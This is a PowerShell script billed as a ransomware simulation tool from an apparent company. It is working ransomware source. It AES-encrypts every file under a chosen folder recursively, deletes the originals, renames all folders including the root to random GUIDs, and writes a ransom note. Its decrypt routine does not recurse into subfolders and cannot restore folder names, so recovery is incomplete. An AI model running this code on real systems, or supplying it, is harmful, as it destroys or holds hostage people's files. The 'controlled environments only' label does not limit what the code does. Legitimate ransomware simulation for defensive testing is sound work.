# ================================================
#           VEILRON TECHNOLOGIES PTE LTD
#        ADVANCED RANSOMWARE SIMULATION TOOL
# ================================================
# Company: Veilron Technologies Pte Ltd
# Description: This script encrypts all files and renames all 
# folders (including the root folder) to simulate ransomware behavior.
# Use in controlled environments only.
# ================================================

# Function to display the banner
function Show-Banner {
    Write-Host "=============================================" -ForegroundColor Cyan
    Write-Host "        VEILRON TECHNOLOGIES PTE LTD        " -ForegroundColor Green
    Write-Host "    ADVANCED RANSOMWARE SIMULATION TOOL     " -ForegroundColor Yellow
    Write-Host "=============================================" -ForegroundColor Cyan
    Write-Host "Company: Veilron Technologies Pte Ltd" -ForegroundColor White
    Write-Host "Description: Simulates ransomware behavior by encrypting" -ForegroundColor White
    Write-Host "             and renaming all files and folders." -ForegroundColor White
    Write-Host "=============================================" -ForegroundColor Cyan
}

# Function to generate a random AES encryption key
function Generate-Key {
    $key = New-Object byte[] 32
    [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($key)
    $keyPath = "$PSScriptRoot\key_file.bin"
    Set-Content -Path $keyPath -Value ([System.Convert]::ToBase64String($key)) -Encoding Ascii
    Write-Host "AES key generated and saved to $keyPath" -ForegroundColor Green
    return $key
}

# Function to load the AES key
function Retrieve-Key {
    $keyPath = "$PSScriptRoot\key_file.bin"
    if (Test-Path $keyPath) {
        $key = [System.Convert]::FromBase64String((Get-Content -Path $keyPath -Raw))
        Write-Host "AES key loaded from $keyPath" -ForegroundColor Green
        return $key
    } else {
        Write-Host "Key file not found! Please generate a key first." -ForegroundColor Red
        return $null
    }
}

# Function to encrypt all files
function Encrypt-Data {
    param (
        [string]$FolderPath,
        [byte[]]$EncryptionKey
    )

    # Generate UUID for session
    $sessionID = [guid]::NewGuid()
    Write-Host "Session ID: $sessionID" -ForegroundColor Cyan

    foreach ($file in Get-ChildItem -Path $FolderPath -File -Recurse) {
        try {
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.Key = $EncryptionKey
            $aes.GenerateIV()

            # Read file content
            $plainText = Get-Content -Path $file.FullName -Raw -Encoding Byte
            if (-not $plainText) {
                Write-Host "Skipping empty or unreadable file: $($file.FullName)" -ForegroundColor Red
                continue
            }

            # Encrypt content
            $cryptoStream = New-Object System.IO.MemoryStream
            $encryptor = $aes.CreateEncryptor()
            $cryptoStreamWriter = New-Object System.Security.Cryptography.CryptoStream($cryptoStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
            $cryptoStreamWriter.Write($plainText, 0, $plainText.Length)
            $cryptoStreamWriter.Close()

            # Save encrypted file
            $encryptedData = $aes.IV + $cryptoStream.ToArray()
            $newFileName = "$($file.DirectoryName)\$([guid]::NewGuid().ToString()).veilron"
            [System.IO.File]::WriteAllBytes($newFileName, $encryptedData)

            # Delete original file
            Remove-Item -Path $file.FullName

            Write-Host "Encrypted file: $newFileName" -ForegroundColor Yellow
        } catch {
            Write-Host "Error processing file: $($file.FullName)" -ForegroundColor Red
            Write-Host $_.Exception.Message
        }
    }

    # Create ransom note
    $notePath = Join-Path -Path $FolderPath -ChildPath "README.txt"
    Set-Content -Path $notePath -Value @"
Your files and folders have been encrypted and renamed!
Your unique ID: $sessionID
To recover them, send an email to fake_email@domain.com with your unique ID.
"@ -Encoding Ascii
    Write-Host "Ransom note created at $notePath" -ForegroundColor Cyan
}

# Function to rename folders
function Rename-Folders {
    param ([string]$FolderPath)

    # Rename all subfolders recursively from deepest level
    Get-ChildItem -Path $FolderPath -Directory -Recurse | Sort-Object -Property FullName -Descending | ForEach-Object {
        $newName = [guid]::NewGuid().ToString()
        $newPath = Join-Path -Path $_.Parent.FullName -ChildPath $newName
        Rename-Item -Path $_.FullName -NewName $newName -Force
        Write-Host "Renamed folder: $($_.FullName) -> $newPath" -ForegroundColor Yellow
    }

    # Rename the root folder
    $rootNewName = [guid]::NewGuid().ToString()
    $rootNewPath = Join-Path -Path (Get-Item $FolderPath).Parent.FullName -ChildPath $rootNewName
    Rename-Item -Path $FolderPath -NewName $rootNewName -Force
    Write-Host "Renamed root folder: $FolderPath -> $rootNewPath" -ForegroundColor Yellow

    return $rootNewPath
}

# Function to decrypt files (rename folders back not supported in this version)
function Decrypt-Data {
    param (
        [string]$FolderPath,
        [byte[]]$DecryptionKey
    )

    foreach ($file in Get-ChildItem -Path $FolderPath -File -Filter "*.veilron") {
        try {
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.Key = $DecryptionKey

            # Extract IV and encrypted content
            $encryptedData = [System.IO.File]::ReadAllBytes($file.FullName)
            $aes.IV = $encryptedData[0..15]
            $cipherText = $encryptedData[16..($encryptedData.Length - 1)]

            # Decrypt content
            $cryptoStream = New-Object System.IO.MemoryStream
            $decryptor = $aes.CreateDecryptor()
            $cryptoStreamWriter = New-Object System.Security.Cryptography.CryptoStream($cryptoStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
            $cryptoStreamWriter.Write($cipherText, 0, $cipherText.Length)
            $cryptoStreamWriter.Close()

            # Save decrypted file
            $decryptedFileName = "$($file.DirectoryName)\decrypted_$([System.IO.Path]::GetFileNameWithoutExtension($file.Name))"
            [System.IO.File]::WriteAllBytes($decryptedFileName, $cryptoStream.ToArray())

            # Delete encrypted file
            Remove-Item -Path $file.FullName

            Write-Host "Decrypted file: $decryptedFileName" -ForegroundColor Green
        } catch {
            Write-Host "Error processing file: $($file.FullName)" -ForegroundColor Red
            Write-Host $_.Exception.Message
        }
    }
}

# Main Program
Show-Banner
Write-Host "1. Generate AES Key" -ForegroundColor White
Write-Host "2. Encrypt All Files and Rename Folders" -ForegroundColor White
Write-Host "3. Decrypt All Files" -ForegroundColor White
Write-Host "4. Exit" -ForegroundColor White

$key = $null

while ($true) {
    $choice = Read-Host "Choose an option"
    switch ($choice) {
        1 {
            $key = Generate-Key
        }
        2 {
            if (-not $key) {
                $key = Retrieve-Key
                if (-not $key) { break }
            }
            $folderPath = Read-Host "Enter folder path to encrypt files"
            $newFolderPath = Rename-Folders -FolderPath $folderPath
            Encrypt-Data -FolderPath $newFolderPath -EncryptionKey $key
        }
        3 {
            if (-not $key) {
                $key = Retrieve-Key
                if (-not $key) { break }
            }
            $folderPath = Read-Host "Enter folder path to decrypt files"
            Decrypt-Data -FolderPath $folderPath -DecryptionKey $key
        }
        4 {
            break
        }
        default {
            Write-Host "Invalid option!" -ForegroundColor Red
        }
    }
}
